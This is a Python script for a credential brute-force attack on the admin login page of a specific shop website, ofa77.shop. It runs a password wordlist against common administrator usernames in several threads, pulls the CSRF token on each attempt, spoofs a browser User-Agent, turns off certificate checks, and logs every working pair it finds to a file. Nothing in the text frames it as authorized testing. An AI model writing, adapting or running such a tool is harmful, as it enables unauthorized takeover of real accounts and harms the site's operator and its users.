import httpx, re, sys
from concurrent.futures import ThreadPoolExecutor
URL='https://ofa77.shop/module/admin/unionshop/user/login'
pwds=[l.strip() for l in open('ofa77_pwds.txt') if l.strip()]
users=['admin','administrator','root','manager','superadmin','ofa77']
import threading
found=[]
lock=threading.Lock()
def worker(args):
    u,p=args
    try:
        c=httpx.Client(verify=False, follow_redirects=True, timeout=20,
            headers={'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121 Safari/537.36'})
        r=c.get(URL); m=re.search(r'name="_token" value="([^"]+)"', r.text); tok=m.group(1) if m else None
        r=c.post(URL, data={'_token':tok,'username':u,'password':p})
        if r.status_code==302 and 'login' not in r.headers.get('location',''):
            found.append((u,p)); 
        elif ('dashboard' in r.text or 'logout' in r.text) and '密碼錯誤' not in r.text and '帳號不存在' not in r.text:
            found.append((u,p))
        c.close()
    except Exception:
        pass
tasks=[(u,p) for u in users for p in pwds]
with open('ofa77_brute_result.txt','w') as f:
    f.write(f'start: {len(tasks)} tasks\n')
with ThreadPoolExecutor(max_workers=4) as ex:
    for i,res in enumerate(ex.map(worker, tasks),1):
        if i%200==0:
            with open('ofa77_brute_result.txt','a') as f:
                f.write(f'progress {i}/{len(tasks)} found={found}\n')
with open('ofa77_brute_result.txt','a') as f:
    f.write(f'DONE total={len(tasks)} found={found}\n')
